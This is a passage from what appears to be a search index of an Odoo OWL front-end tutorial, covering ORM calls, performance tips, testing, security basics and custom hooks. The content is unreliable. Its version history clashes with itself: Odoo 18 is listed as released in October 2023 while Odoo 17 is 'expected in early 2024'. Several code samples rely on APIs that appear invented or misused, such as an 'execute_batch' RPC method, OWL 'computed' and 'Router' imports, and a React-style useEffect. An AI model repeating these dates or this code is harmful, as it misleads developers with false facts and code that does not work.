before\ndocument.addEventListener('click', (event) =&gt; {\n  const target = event.target as HTMLElement;\n  if (target.tagName === 'A' &amp;&amp; target.getAttribute('href')?.startsWith('/')) {\n    event.preventDefault();\n    const path = target.getAttribute('href');\n    router.navigate(path!);\n  }\n});\n</code></pre></p> </li> </ol>"},{"location":"odoo/owl/#c-utilizing-odoos-orm-with-owl","title":"c. Utilizing Odoo's ORM with OWL","text":"<p>To leverage Odoo's ORM capabilities within OWL components, integrate ORM methods through the RPC service.</p> <p>Example: Updating a Partner's Information</p> <ol> <li> <p>Add an Update Method in RPCService: <pre><code>// static/src/ts/services/RPCService.ts\nasync updatePartner(id: number, data: any) {\n  return await this.call('res.partner', 'write', [[id], data]);\n}\n</code></pre></p> </li> <li> <p>Use the Update Method in a Component: <pre><code>// static/src/ts/components/UpdatePartnerComponent.ts\nimport { Component, useState } from '@odoo/owl';\nimport { RPCService } from '../services/RPCService';\n\nexport class UpdatePartnerComponent extends Component {\n  static template = 'my_owl_module.UpdatePartnerComponent';\n\n  setup() {\n    this.state = useState({\n      id: null,\n      name: '',\n      email: '',\n    });\n  }\n\n  async updatePartner() {\n    if (!this.state.id) {\n      alert('Partner ID is required.');\n      return;\n    }\n    const service = new RPCService();\n    const success = await service.updatePartner(this.state.id, {\n      name: this.state.name,\n      email: this.state.email,\n    });\n    if (success) {\n      alert('Partner updated successfully.');\n    } else {\n      alert('Failed to update partner.');\n    }\n  }\n}\n</code></pre></p> </li> <li> <p>Define the Update Partner Template: <pre><code>&lt;!-- views/update_partner_template.xml --&gt;\n&lt;templates&gt;\n  &lt;t t-name=\"my_owl_module.UpdatePartnerComponent\"&gt;\n    &lt;div class=\"update-partner\"&gt;\n      &lt;h2&gt;Update Partner&lt;/h2&gt;\n      &lt;input type=\"number\" t-model=\"state.id\" placeholder=\"Partner ID\"/&gt;\n      &lt;input type=\"text\" t-model=\"state.name\" placeholder=\"Name\"/&gt;\n      &lt;input type=\"email\" t-model=\"state.email\" placeholder=\"Email\"/&gt;\n      &lt;button t-on-click=\"updatePartner\"&gt;Update Partner&lt;/button&gt;\n    &lt;/div&gt;\n  &lt;/t&gt;\n&lt;/templates&gt;\n</code></pre></p> </li> <li> <p>Include and Mount the Update Partner Component: <pre><code>&lt;!-- views/my_model_views.xml --&gt;\n&lt;odoo&gt;\n  &lt;record id=\"view_my_model_form\" model=\"ir.ui.view\"&gt;\n    &lt;field name=\"name\"&gt;my.model.form&lt;/field&gt;\n    &lt;field name=\"model\"&gt;my.model&lt;/field&gt;\n    &lt;field name=\"arch\" type=\"xml\"&gt;\n      &lt;form string=\"My Model\"&gt;\n        &lt;sheet&gt;\n          &lt;group&gt;\n            &lt;field name=\"name\"/&gt;\n          &lt;/group&gt;\n          &lt;div id=\"update_partner_app\"/&gt;\n        &lt;/sheet&gt;\n      &lt;/form&gt;\n    &lt;/field&gt;\n  &lt;/record&gt;\n&lt;/odoo&gt;\n</code></pre></p> <pre><code>// static/src/ts/main.ts\n// ... previous imports\nimport { UpdatePartnerComponent } from './components/UpdatePartnerComponent';\n\nregistry.category('actions').add('update_partner', UpdatePartnerComponent);\n\n// ... previous mounts\napp.components.add('update_partner', UpdatePartnerComponent);\napp.mount('#update_partner_app');\n</code></pre> </li> </ol>"},{"location":"odoo/owl/#8-performance-optimization-in-owl","title":"8. Performance Optimization in OWL","text":"<p>Optimizing the performance of OWL-based applications ensures a smooth and responsive user experience, especially as the application scales.</p>"},{"location":"odoo/owl/#a-minimizing-re-renders","title":"a. Minimizing Re-Renders","text":"<p>OWL's reactivity system automatically updates the UI when state changes. However, unnecessary re-renders can degrade performance.</p> <p>Best Practices:</p> <ul> <li>Immutable State: Use immutable data structures to prevent unintended state mutations.</li> <li>Selective State Updates: Only update the parts of the state that are necessary.</li> <li>Memoization: Cache expensive computations or derived data.</li> </ul> <p>Example: Using Computed Properties</p> <pre><code>// static/src/ts/components/ExpensiveComponent.ts\nimport { Component, useState, computed } from '@odoo/owl';\n\nexport class ExpensiveComponent extends Component {\n  static template = 'my_owl_module.ExpensiveComponent';\n\n  setup() {\n    this.state = useState({\n      items: [...], // large dataset\n    });\n\n    this.filteredItems = computed(() =&gt; {\n      return this.state.items.filter(item =&gt; item.active);\n    });\n  }\n}\n</code></pre>"},{"location":"odoo/owl/#b-lazy-loading-components","title":"b. Lazy Loading Components","text":"<p>Load components only when they are needed to reduce the initial load time.</p> <p>Example: Dynamically Importing a Component</p> <pre><code>// static/src/ts/routes.ts\nimport { Route, Router } from '@odoo/owl';\n\nexport const routes: Route[] = [\n  {\n    path: '/',\n    component: () =&gt; import('./components/GreetingComponent').then(m =&gt; m.GreetingComponent),\n  },\n  {\n    path: '/partners',\n    component: () =&gt; import('./components/PartnerListComponent').then(m =&gt; m.PartnerListComponent),\n  },\n];\n</code></pre>"},{"location":"odoo/owl/#c-code-splitting","title":"c. Code Splitting","text":"<p>Divide the codebase into smaller chunks that can be loaded on demand.</p> <p>Implementation:</p> <p>Configure Webpack (if used) to enable code splitting based on routes or components.</p> <pre><code>// webpack.config.js\nmodule.exports = {\n  // ... other configurations ...\n  optimization: {\n    splitChunks: {\n      chunks: 'all',\n    },\n  },\n};\n</code></pre>"},{"location":"odoo/owl/#d-efficient-state-management","title":"d. Efficient State Management","text":"<p>Avoid storing large amounts of data in component state. Use stores or external state management solutions for global state.</p> <p>Example: Using OWL Stores for Large Datasets</p> <pre><code>// static/src/ts/stores/PartnerStore.ts\nimport { reactive } from '@odoo/owl';\n\nexport const PartnerStore = reactive({\n  partners: [],\n  loading: false,\n  async fetchPartners() {\n    this.loading = true;\n    const service = new RPCService();\n    this.partners = await service.fetchPartners();\n    this.loading = false;\n  },\n});\n</code></pre> <p>Use in Components:</p> <pre><code>// static/src/ts/components/PartnerListComponent.ts\nimport { Component, useState } from '@odoo/owl';\nimport { PartnerStore } from '../stores/PartnerStore';\n\nexport class PartnerListComponent extends Component {\n  static template = 'my_owl_module.PartnerListComponent';\n\n  setup() {\n    this.state = PartnerStore;\n    if (this.state.partners.length === 0) {\n      this.state.fetchPartners();\n    }\n  }\n}\n</code></pre>"},{"location":"odoo/owl/#e-optimizing-rpc-calls","title":"e. Optimizing RPC Calls","text":"<p>Reduce the number of RPC calls by batching requests or caching responses.</p> <p>Example: Batching RPC Calls</p> <pre><code>// static/src/ts/services/RPCService.ts\nimport { ajax } from '@odoo/owl';\n\nexport class RPCService {\n  // ... existing methods ...\n\n  async batchCalls(calls: any[]) {\n    return await ajax.jsonRpc(this.url, 'call', {\n      service: 'object',\n      method: 'execute_batch',\n      args: [this.db, this.uid, this.password, calls],\n    });\n  }\n}\n</code></pre>"},{"location":"odoo/owl/#9-best-practices-for-owl-development","title":"9. Best Practices for OWL Development","text":"<p>Adhering to best practices ensures that OWL-based Odoo applications are maintainable, scalable, and efficient.</p>"},{"location":"odoo/owl/#a-component-reusability","title":"a. Component Reusability","text":"<p>Design components to be reusable across different parts of the application.</p> <p>Best Practices:</p> <ul> <li>Encapsulate Functionality: Keep components focused on specific tasks.</li> <li>Use Props Effectively: Pass data and callbacks through props to maintain component independence.</li> <li>Avoid Tight Coupling: Ensure components do not depend heavily on external states or contexts.</li> </ul>"},{"location":"odoo/owl/#b-type-safety-with-typescript","title":"b. Type Safety with TypeScript","text":"<p>Leverage TypeScript's type system to catch errors early and improve code quality.</p> <p>Best Practices:</p> <ul> <li> <p>Define Interfaces and Types: Clearly define the structure of props and state.     <pre><code>// static/src/ts/components/GreetingComponent.ts\nimport { Component } from '@odoo/owl';\n\ninterface GreetingProps {\n  name: string;\n}\n\ninterface GreetingState {\n  count: number;\n}\n\nexport class GreetingComponent extends Component&lt;GreetingProps&gt; {\n  static template = 'my_owl_module.GreetingComponent';\n\n  state: GreetingState;\n\n  setup() {\n    this.state = useState&lt;GreetingState&gt;({\n      count: 0,\n    });\n  }\n\n  greet() {\n    this.state.count += 1;\n    alert(`Hello, ${this.props.name}! You've been greeted ${this.state.count} times.`);\n  }\n}\n</code></pre></p> </li> <li> <p>Enable Strict Type Checking: Configure <code>tsconfig.json</code> for strict type enforcement.     <pre><code>{\n  \"compilerOptions\": {\n    \"strict\": true,\n    // ... other options ...\n  }\n}\n</code></pre></p> </li> </ul>"},{"location":"odoo/owl/#c-consistent-coding-standards","title":"c. Consistent Coding Standards","text":"<p>Maintain a consistent coding style across the codebase to enhance readability and maintainability.</p> <p>Best Practices:</p> <ul> <li>Use Linters: Integrate tools like ESLint for enforcing coding standards.</li> <li>Adopt Naming Conventions: Use consistent naming for variables, functions, and components.</li> <li>Document Components: Provide clear documentation and comments for complex components and logic.</li> </ul>"},{"location":"odoo/owl/#d-modular-architecture","title":"d. Modular Architecture","text":"<p>Organize the codebase into modules to promote separation of concerns and scalability.</p> <p>Best Practices:</p> <ul> <li>Feature-Based Organization: Group related components, services, and stores by feature.</li> <li>Avoid Monolithic Components: Break down large components into smaller, manageable pieces.</li> <li>Leverage OWL's Registry: Use OWL's registry to manage component registration and dependencies.</li> </ul>"},{"location":"odoo/owl/#e-performance-monitoring","title":"e. Performance Monitoring","text":"<p>Continuously monitor the application's performance to identify and address bottlenecks.</p> <p>Tools and Techniques:</p> <ul> <li>Browser Developer Tools: Use performance profiling tools to analyze rendering times and memory usage.</li> <li>OWA Performance Metrics: Utilize OWL's built-in performance tracking capabilities.</li> <li>Automated Testing: Implement performance tests to ensure changes do not degrade performance.</li> </ul>"},{"location":"odoo/owl/#f-accessibility-considerations","title":"f. Accessibility Considerations","text":"<p>Ensure that OWL-based components are accessible to all users, adhering to web accessibility standards.</p> <p>Best Practices:</p> <ul> <li>Use Semantic HTML: Utilize appropriate HTML elements for better accessibility.</li> <li>ARIA Attributes: Implement ARIA roles and attributes where necessary.</li> <li>Keyboard Navigation: Ensure that all interactive elements are accessible via keyboard.</li> </ul> <p>Example: Adding ARIA Attributes</p> <pre><code>&lt;!-- views/greeting_template.xml --&gt;\n&lt;templates&gt;\n  &lt;t t-name=\"my_owl_module.GreetingComponent\"&gt;\n    &lt;div class=\"greeting\"&gt;\n      &lt;p&gt;Hello, &lt;t t-esc=\"props.name\"/&gt;!&lt;/p&gt;\n      &lt;button t-on-click=\"greet\" aria-label=\"Greet User\"&gt;Greet&lt;/button&gt;\n    &lt;/div&gt;\n  &lt;/t&gt;\n&lt;/templates&gt;\n</code></pre>"},{"location":"odoo/owl/#10-latest-features-in-owl-for-odoo-16-17-18","title":"10. Latest Features in OWL for Odoo 16, 17, 18","text":"<p>Odoo continuously enhances OWL with new features and improvements to align with modern web development standards and developer needs. Here's a look at the latest features introduced in OWL across Odoo versions 16, 17, and 18.</p>"},{"location":"odoo/owl/#a-odoo-16","title":"a. Odoo 16","text":"<p>Released: August 2023</p> <p>Key OWL Features:</p> <ol> <li> <p>Improved Component Lifecycle Management:</p> <ul> <li>Enhanced hooks for better control over component mounting and unmounting.</li> <li>Lifecycle events to manage side effects more effectively.</li> </ul> </li> <li> <p>Enhanced State Management:</p> <ul> <li>Introduction of reactive stores for better global state handling.</li> <li>Integration with Odoo's ORM for seamless data synchronization.</li> </ul> </li> <li> <p>Optimized Rendering:</p> <ul> <li>Improved virtual DOM diffing algorithm for faster UI updates.</li> <li>Reduced memory footprint for large applications.</li> </ul> </li> <li> <p>TypeScript Enhancements:</p> <ul> <li>Better TypeScript definitions for OWL components.</li> <li>Improved tooling support for type checking and autocompletion.</li> </ul> </li> </ol>"},{"location":"odoo/owl/#b-odoo-17","title":"b. Odoo 17","text":"<p>Released: Expected in early 2024</p> <p>Key OWL Features:</p> <ol> <li> <p>Advanced Routing Capabilities:</p> <ul> <li>Support for nested and dynamic routes.</li> <li>Enhanced route guards for better security and access control.</li> </ul> </li> <li> <p>Asynchronous Component Loading:</p> <ul> <li>Lazy loading of components to improve initial load times.</li> <li>Support for code splitting and dynamic imports.</li> </ul> </li> <li> <p>Improved Hooks API:</p> <ul> <li>New hooks for managing asynchronous data fetching.</li> <li>Enhanced side-effect management with better cleanup mechanisms.</li> </ul> </li> <li> <p>Accessibility Improvements:</p> <ul> <li>Built-in support for ARIA roles and attributes.</li> <li>Enhanced keyboard navigation support across components.</li> </ul> </li> </ol>"},{"location":"odoo/owl/#c-odoo-18","title":"c. Odoo 18","text":"<p>Released: October 2023</p> <p>Key OWL Features:</p> <ol> <li> <p>Custom Directive Support:</p> <ul> <li>Introduction of custom directives for extending component behavior.</li> <li>Ability to create reusable directives for common functionalities.</li> </ul> </li> <li> <p>Enhanced Animation Support:</p> <ul> <li>Built-in animation utilities for smoother UI transitions.</li> <li>Integration with CSS animations and JavaScript-based animations.</li> </ul> </li> <li> <p>Performance Optimizations:</p> <ul> <li>Further optimizations to the virtual DOM for even faster rendering.</li> <li>Memory leak fixes and improved garbage collection.</li> </ul> </li> <li> <p>Integration with Modern JavaScript Libraries:</p> <ul> <li>Seamless integration capabilities with libraries like D3.js for data visualization.</li> <li>Enhanced interoperability with third-party UI libraries.</li> </ul> </li> <li> <p>Improved Testing Utilities:</p> <ul> <li>New tools and utilities for testing OWL components.</li> <li>Better integration with testing frameworks like Jest.</li> </ul> </li> </ol> <p>Example: Using Custom Directives in Odoo 18</p> <ol> <li> <p>Define a Custom Directive: <pre><code>// static/src/ts/directives/TooltipDirective.ts\nimport { Directive, onMounted, onBeforeUnmount } from '@odoo/owl';\n\nexport class TooltipDirective {\n  constructor(public el: HTMLElement, public text: string) {}\n\n  onMounted() {\n    this.el.title = this.text;\n  }\n\n  onBeforeUnmount() {\n    this.el.title = '';\n  }\n}\n</code></pre></p> </li> <li> <p>Use the Directive in a Component: <pre><code>// static/src/ts/components/TooltipComponent.ts\nimport { Component, onMounted } from '@odoo/owl';\nimport { TooltipDirective } from '../directives/TooltipDirective';\n\nexport class TooltipComponent extends Component {\n  static template = 'my_owl_module.TooltipComponent';\n\n  setup() {\n    onMounted(() =&gt; {\n      new TooltipDirective(this.el.querySelector('.tooltip-element')!, 'This is a tooltip');\n    });\n  }\n}\n</code></pre></p> </li> <li> <p>Define the Tooltip Component Template: <pre><code>&lt;!-- views/tooltip_template.xml --&gt;\n&lt;templates&gt;\n  &lt;t t-name=\"my_owl_module.TooltipComponent\"&gt;\n    &lt;div class=\"tooltip-container\"&gt;\n      &lt;span class=\"tooltip-element\"&gt;Hover over me&lt;/span&gt;\n    &lt;/div&gt;\n  &lt;/t&gt;\n&lt;/templates&gt;\n</code></pre></p> </li> </ol>"},{"location":"odoo/owl/#11-testing-owl-components","title":"11. Testing OWL Components","text":"<p>Ensuring that OWL components function correctly is vital for maintaining application reliability. Implement comprehensive testing strategies to validate component behavior, interactions, and integrations.</p>"},{"location":"odoo/owl/#a-unit-testing-with-jest","title":"a. Unit Testing with Jest","text":"<p>Jest is a popular testing framework for JavaScript and TypeScript applications. It provides a robust environment for unit testing OWL components.</p> <p>Setup Jest in Your Module:</p> <ol> <li> <p>Install Jest and Related Dependencies: <pre><code>npm install --save-dev jest ts-jest @types/jest\n</code></pre></p> </li> <li> <p>Configure Jest:     Create a <code>jest.config.js</code> file in your module directory.     <pre><code>// jest.config.js\nmodule.exports = {\n  preset: 'ts-jest',\n  testEnvironment: 'jsdom',\n  moduleNameMapper: {\n    '^@odoo/owl$': '&lt;rootDir&gt;/node_modules/@odoo/owl/dist/owl.js',\n  },\n  setupFilesAfterEnv: ['&lt;rootDir&gt;/jest.setup.js'],\n};\n</code></pre></p> </li> <li> <p>Set Up Testing Environment:     Create a <code>jest.setup.js</code> file.     <pre><code>// jest.setup.js\nimport '@odoo/owl/dist/owl.css';\n</code></pre></p> </li> <li> <p>Write a Unit Test for GreetingComponent: <pre><code>// static/src/ts/components/__tests__/GreetingComponent.test.ts\nimport { GreetingComponent } from '../GreetingComponent';\nimport { mount } from '@odoo/owl/test-utils';\n\ndescribe('GreetingComponent', () =&gt; {\n  it('renders the correct greeting message', () =&gt; {\n    const component = mount(GreetingComponent, {\n      props: { name: 'Test User' },\n    });\n    expect(component.el.querySelector('p')?.textContent).toBe('Hello, Test User!');\n  });\n\n  it('increments count on greet', () =&gt; {\n    const component = mount(GreetingComponent, {\n      props: { name: 'Test User' },\n    });\n    const button = component.el.querySelector('button')!;\n    button.click();\n    expect(component.state.count).toBe(1);\n  });\n});\n</code></pre></p> </li> <li> <p>Run the Tests: <pre><code>npm run test\n</code></pre></p> </li> </ol>"},{"location":"odoo/owl/#b-integration-testing","title":"b. Integration Testing","text":"<p>Test how OWL components interact with each other and with Odoo's backend.</p> <p>Example: Testing PartnerListComponent Interaction with PartnerDetailComponent</p> <ol> <li>Write the Integration Test: <pre><code>// static/src/ts/components/__tests__/PartnerIntegration.test.ts\nimport { PartnerListComponent } from '../PartnerListComponent';\nimport { PartnerDetailComponent } from '../PartnerDetailComponent';\nimport { mount } from '@odoo/owl/test-utils';\nimport { GreetingStore } from '../../stores/GreetingStore';\n\ndescribe('Partner Integration', () =&gt; {\n  it('displays partner details when a partner is selected', async () =&gt; {\n    const partnerList = mount(PartnerListComponent);\n    await partnerList.state.fetchPartners();\n    expect(partnerList.state.partners.length).toBeGreaterThan(0);\n\n    const firstPartner = partnerList.state.partners[0];\n    const partnerDetail = mount(PartnerDetailComponent, {\n      props: { params: { id: firstPartner.id } },\n    });\n    await partnerDetail.state.loadPartner();\n    expect(partnerDetail.state.partner.name).toBe(firstPartner.name);\n  });\n});\n</code></pre></li> </ol>"},{"location":"odoo/owl/#c-end-to-end-e2e-testing-with-cypress","title":"c. End-to-End (E2E) Testing with Cypress","text":"<p>Simulate real user interactions to test the complete workflow of OWL-based applications.</p> <p>Setup Cypress:</p> <ol> <li> <p>Install Cypress: <pre><code>npm install --save-dev cypress\n</code></pre></p> </li> <li> <p>Initialize Cypress: <pre><code>npx cypress open\n</code></pre>     This will create the necessary Cypress folders and example tests.</p> </li> <li> <p>Write an E2E Test for GreetingComponent: <pre><code>// cypress/integration/greeting_spec.js\ndescribe('GreetingComponent', () =&gt; {\n  it('displays the correct greeting and increments count', () =&gt; {\n    cy.visit('/'); // Adjust the URL based on your routing\n\n    cy.get('.greeting p').should('contain', 'Hello, Test User!');\n    cy.get('.greeting button').click();\n    cy.on('window:alert', (str) =&gt; {\n      expect(str).to.equal('Hello, Test User! You\\'ve been greeted 1 times.');\n    });\n  });\n});\n</code></pre></p> </li> <li> <p>Run Cypress Tests: <pre><code>npx cypress run\n</code></pre></p> </li> </ol>"},{"location":"odoo/owl/#d-mocking-backend-calls","title":"d. Mocking Backend Calls","text":"<p>Use mocking to isolate components from the backend during testing.</p> <p>Example: Mocking RPCService in Unit Tests</p> <ol> <li> <p>Mock RPCService: <pre><code>// static/src/ts/services/__mocks__/RPCService.ts\nexport class RPCService {\n  async fetchPartners() {\n    return [\n      { id: 1, name: 'Partner One', email: 'partner1@example.com' },\n      { id: 2, name: 'Partner Two', email: 'partner2@example.com' },\n    ];\n  }\n\n  async fetchPartnerById(id: number) {\n    return { id, name: `Partner ${id}`, email: `partner${id}@example.com` };\n  }\n\n  async createPartner(data: any) {\n    return 3; // Mocked new partner ID\n  }\n\n  async updatePartner(id: number, data: any) {\n    return true; // Mocked successful update\n  }\n}\n</code></pre></p> </li> <li> <p>Configure Jest to Use Mocks: <pre><code>// jest.config.js\nmodule.exports = {\n  // ... existing config ...\n  moduleNameMapper: {\n    '^@odoo/owl$': '&lt;rootDir&gt;/node_modules/@odoo/owl/dist/owl.js',\n    '^./services/RPCService$': '&lt;rootDir&gt;/static/src/ts/services/__mocks__/RPCService.ts',\n  },\n};\n</code></pre></p> </li> <li> <p>Use Mocked Service in Tests: <pre><code>// static/src/ts/components/__tests__/PartnerListComponent.test.ts\nimport { PartnerListComponent } from '../PartnerListComponent';\nimport { mount } from '@odoo/owl/test-utils';\nimport { RPCService } from '../../services/RPCService';\n\njest.mock('../../services/RPCService');\n\ndescribe('PartnerListComponent', () =&gt; {\n  it('loads and displays partners', async () =&gt; {\n    const component = mount(PartnerListComponent);\n    await component.state.loadPartners();\n    expect(component.state.partners.length).toBe(2);\n    expect(component.state.partners[0].name).toBe('Partner One');\n  });\n});\n</code></pre></p> </li> </ol>"},{"location":"odoo/owl/#12-security-considerations-in-owl","title":"12. Security Considerations in OWL","text":"<p>Securing OWL-based applications is paramount to protect sensitive data and maintain system integrity. Implement robust security measures to safeguard against common vulnerabilities.</p>"},{"location":"odoo/owl/#a-sanitizing-user-inputs","title":"a. Sanitizing User Inputs","text":"<p>Ensure that all user inputs are sanitized to prevent Cross-Site Scripting (XSS) attacks.</p> <p>Example: Using OWL's Built-in Sanitization</p> <p>OWL provides mechanisms to safely render user-generated content.</p> <pre><code>&lt;!-- views/safe_content_template.xml --&gt;\n&lt;templates&gt;\n  &lt;t t-name=\"my_owl_module.SafeContentComponent\"&gt;\n    &lt;div class=\"safe-content\"&gt;\n      &lt;div t-raw=\"sanitize(props.userContent)\"/&gt;\n    &lt;/div&gt;\n  &lt;/t&gt;\n&lt;/templates&gt;\n</code></pre> <p>Note: Always sanitize or escape user inputs before rendering them in the UI.</p>"},{"location":"odoo/owl/#b-protecting-against-csrf","title":"b. Protecting Against CSRF","text":"<p>Implement Cross-Site Request Forgery (CSRF) protection when making state-changing RPC calls.</p> <p>Best Practices:</p> <ul> <li>Use Odoo's CSRF Tokens: Leverage Odoo's built-in CSRF protection mechanisms.</li> <li>Validate CSRF Tokens on the Server: Ensure that all state-changing requests include valid CSRF tokens.</li> </ul> <p>Example: Including CSRF Token in RPCService</p> <pre><code>// static/src/ts/services/RPCService.ts\nimport { ajax } from '@odoo/owl';\n\nexport class RPCService {\n  // ... existing properties ...\n\n  async authenticate() {\n    const csrfToken = document.querySelector('meta[name=\"csrf-token\"]')?.getAttribute('content');\n    this.csrfToken = csrfToken;\n    // Include CSRF token in headers\n    ajax.defaultOptions.headers = {\n      'X-CSRF-Token': this.csrfToken,\n    };\n    // Proceed with authentication\n    const response = await ajax.jsonRpc(this.url, 'call', {\n      service: 'common',\n      method: 'authenticate',\n      args: [this.db, this.username, this.password, {}],\n    });\n    this.uid = response;\n  }\n\n  // ... existing methods ...\n}\n</code></pre>"},{"location":"odoo/owl/#c-implementing-authentication-and-authorization","title":"c. Implementing Authentication and Authorization","text":"<p>Ensure that only authorized users can access specific components and perform certain actions.</p> <p>Best Practices:</p> <ul> <li>Role-Based Access Control (RBAC): Define user roles and permissions within Odoo and enforce them in OWL components.</li> <li>Secure API Endpoints: Protect backend RPC methods to ensure they are accessible only to authenticated users.</li> <li>Token-Based Authentication: Use secure tokens (e.g., JWT) for authenticating RPC calls.</li> </ul> <p>Example: Restricting Component Access Based on User Role</p> <pre><code>// static/src/ts/components/AdminOnlyComponent.ts\nimport { Component } from '@odoo/owl';\nimport { RPCService } from '../services/RPCService';\n\nexport class AdminOnlyComponent extends Component {\n  static template = 'my_owl_module.AdminOnlyComponent';\n\n  setup() {\n    this.state = useState({\n      isAdmin: false,\n    });\n    this.checkAdmin();\n  }\n\n  async checkAdmin() {\n    const service = new RPCService();\n    const user = await service.call('res.users', 'read', [[this.env.uid], ['groups_id']]);\n    this.state.isAdmin = user.groups_id.includes('base.group_system');\n  }\n}\n</code></pre> <pre><code>&lt;!-- views/admin_only_template.xml --&gt;\n&lt;templates&gt;\n  &lt;t t-name=\"my_owl_module.AdminOnlyComponent\"&gt;\n    &lt;t t-if=\"state.isAdmin\"&gt;\n      &lt;div class=\"admin-section\"&gt;\n        &lt;h2&gt;Admin Only Section&lt;/h2&gt;\n        &lt;!-- Admin functionalities --&gt;\n      &lt;/div&gt;\n    &lt;/t&gt;\n    &lt;t t-else&gt;\n      &lt;div class=\"no-access\"&gt;\n        &lt;p&gt;You do not have access to this section.&lt;/p&gt;\n      &lt;/div&gt;\n    &lt;/t&gt;\n  &lt;/t&gt;\n&lt;/templates&gt;\n</code></pre>"},{"location":"odoo/owl/#d-securing-data-transmission","title":"d. Securing Data Transmission","text":"<p>Ensure that data transmitted between the client and server is secure.</p> <p>Best Practices:</p> <ul> <li>Use HTTPS: Encrypt data in transit by serving the application over HTTPS.</li> <li>Implement Content Security Policy (CSP): Define approved sources for content to prevent injection attacks.</li> <li>Validate Server Responses: Ensure that the backend sends only the necessary data and adheres to strict data formats.</li> </ul> <p>Example: Configuring HTTPS with Nginx</p> <pre><code>server {\n    listen 80;\n    server_name yourdomain.com;\n    return 301 https://$server_name$request_uri;\n}\n\nserver {\n    listen 443 ssl;\n    server_name yourdomain.com;\n\n    ssl_certificate /etc/letsencrypt/live/yourdomain.com/fullchain.pem;\n    ssl_certificate_key /etc/letsencrypt/live/yourdomain.com/privkey.pem;\n\n    location / {\n        proxy_pass http://localhost:8069;\n        proxy_set_header Host $host;\n        proxy_set_header X-Real-IP $remote_addr;\n        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;\n        proxy_set_header X-Forwarded-Proto $scheme;\n    }\n}\n</code></pre>"},{"location":"odoo/owl/#e-regular-security-audits","title":"e. Regular Security Audits","text":"<p>Conduct regular security audits to identify and mitigate vulnerabilities.</p> <p>Best Practices:</p> <ul> <li>Code Reviews: Regularly review OWL component code for potential security issues.</li> <li>Penetration Testing: Simulate attacks to assess the application's security posture.</li> <li>Stay Updated: Keep OWL and Odoo dependencies up-to-date with the latest security patches.</li> </ul>"},{"location":"odoo/owl/#13-extending-owl-with-custom-functionality","title":"13. Extending OWL with Custom Functionality","text":"<p>Enhancing OWL components with custom functionality allows for tailored user experiences and advanced features.</p>"},{"location":"odoo/owl/#a-creating-custom-directives","title":"a. Creating Custom Directives","text":"<p>Directives extend the behavior of DOM elements within OWL components.</p> <p>Example: Creating a Custom Tooltip Directive</p> <ol> <li> <p>Define the Directive: <pre><code>// static/src/ts/directives/TooltipDirective.ts\nimport { Directive, onMounted, onBeforeUnmount } from '@odoo/owl';\n\nexport class TooltipDirective {\n  constructor(public el: HTMLElement, public text: string) {}\n\n  onMounted() {\n    this.el.title = this.text;\n  }\n\n  onBeforeUnmount() {\n    this.el.title = '';\n  }\n}\n</code></pre></p> </li> <li> <p>Use the Directive in a Component: <pre><code>// static/src/ts/components/TooltipComponent.ts\nimport { Component, onMounted } from '@odoo/owl';\nimport { TooltipDirective } from '../directives/TooltipDirective';\n\nexport class TooltipComponent extends Component {\n  static template = 'my_owl_module.TooltipComponent';\n\n  setup() {\n    onMounted(() =&gt; {\n      const tooltipElement = this.el.querySelector('.tooltip-element')!;\n      new TooltipDirective(tooltipElement, 'This is a tooltip');\n    });\n  }\n}\n</code></pre></p> </li> <li> <p>Define the Tooltip Component Template: <pre><code>&lt;!-- views/tooltip_template.xml --&gt;\n&lt;templates&gt;\n  &lt;t t-name=\"my_owl_module.TooltipComponent\"&gt;\n    &lt;div class=\"tooltip-container\"&gt;\n      &lt;span class=\"tooltip-element\"&gt;Hover over me&lt;/span&gt;\n    &lt;/div&gt;\n  &lt;/t&gt;\n&lt;/templates&gt;\n</code></pre></p> </li> </ol>"},{"location":"odoo/owl/#b-developing-custom-hooks","title":"b. Developing Custom Hooks","text":"<p>Hooks manage side effects and component lifecycle events, enhancing component capabilities.</p> <p>Example: Creating a Custom Hook for Data Fetching</p> <ol> <li> <p>Define the Hook: <pre><code>// static/src/ts/hooks/useFetch.ts\nimport { useState, useEffect } from '@odoo/owl';\nimport { RPCService } from '../services/RPCService';\n\nexport function useFetch(model: string, method: string, args: any[], fields: string[]) {\n  const state = useState({\n    data: [],\n    loading: true,\n    error: null,\n  });\n\n  useEffect(() =&gt; {\n    const fetchData = async () =&gt; {\n      try {\n        const service = new RPCService();\n        const result = await service.call(model, method, args, { fields });\n        state.data = result;\n      } catch (error) {\n        state.error = error;\n      } finally {\n        state.loading = false;\n      }\n    };\n\n    fetchData();\n  }, [model, method, JSON.stringify(args), JSON.stringify(fields)]);\n\n  return state;\n}\n</code></pre></p> </li> <li> <p>Use the Custom Hook in a Component: <pre><code>// static/src/ts/components/PartnerListWithHook.ts\nimport { Component } from '@odoo/owl';\nimport { useFetch } from '../hooks/useFetch';\n\nexport class PartnerListWithHook extends Component {\n  static template = 'my_owl_module.PartnerListWithHook';\n\n  setup() {\n    this.state = useFetch('res.partner', 'search_read', [[]], ['name', 'email']);\n  }\n}\n</code></pre></p> </li> <li> <p>Define the Partner List with Hook Template: <pre><code>&lt;!-- views/partner_list_with_hook_template.xml --&gt;\n&lt;templates&gt;\n  &lt;t t-name=\"my_owl_module.PartnerListWithHook\"&gt;\n    &lt;div class=\"partner-list\"&gt;\n      &lt;h2&gt;Partners&lt;/h2&gt;\n      &lt;t t-if=\"state.loading\"&gt;\n        &lt;p&gt;Loading partners...&lt;/p&gt;\n      &lt;/t&gt;\n      &lt;t t-elif=\"state.error\"&gt;\n        &lt;p&gt;Error loading partners: &lt;t t-esc=\"state.error.message\"/&gt;&lt;/p&gt;\n      &lt;/t&gt;\n      &lt;t t-else&gt;\n        &lt;ul&gt;\n          &lt;li t-foreach=\"state.data\" t-as=\"partner\"&gt;\n            &lt;strong&gt;&lt;t t-esc=\"partner.name\"/&gt;&lt;/strong&gt; - &lt;t t-esc=\"partner.email\"/&gt;\n          &lt;/li&gt;\n        &lt;/ul&gt;\n      &lt;/t&gt;\n    &lt;/div&gt;\n  &lt;/t&gt;\n&lt;/templates&gt;\n</code></pre></p> </li> </ol>"},{"location":"odoo/owl/#14-integration-with-external-libraries","title":"14. Integration with External Libraries","text":"<p>Integrating third-party libraries can enhance the functionality and user experience of OWL-based Odoo applications.</p>"},{"location":"odoo/owl/#a-integrating-d3js-for-data-visualization","title":"a. Integrating D3.js for Data Visualization","text":"<p>Example: Creating a Bar Chart Component with D3.js</p> <ol> <li> <p>Install D3.js: <pre><code>npm install d3 --save\n</code></pre></p> </li> <li> <p>Define the BarChart Component: <pre><code>// 